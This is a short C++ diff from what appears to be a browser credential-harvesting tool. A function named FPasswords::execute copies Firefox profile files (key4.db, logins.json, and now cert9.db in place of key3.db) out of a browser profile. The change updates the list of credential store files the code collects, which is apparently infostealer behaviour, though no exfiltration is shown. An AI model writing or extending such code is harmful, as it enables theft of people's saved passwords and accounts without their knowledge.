@@ -7,7 +7,7 @@
 void FPasswords::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
     fs::path current_profile_path = this->withProfile(browser_root);
 
-    for(std::string key : {"key3.db", "key4.db", "logins.json"})
+    for(std::string key : {"cert9.db", "key4.db", "logins.json"})
     {
         fs::path to_copy = current_profile_path / key;
         if(!exists(to_copy))
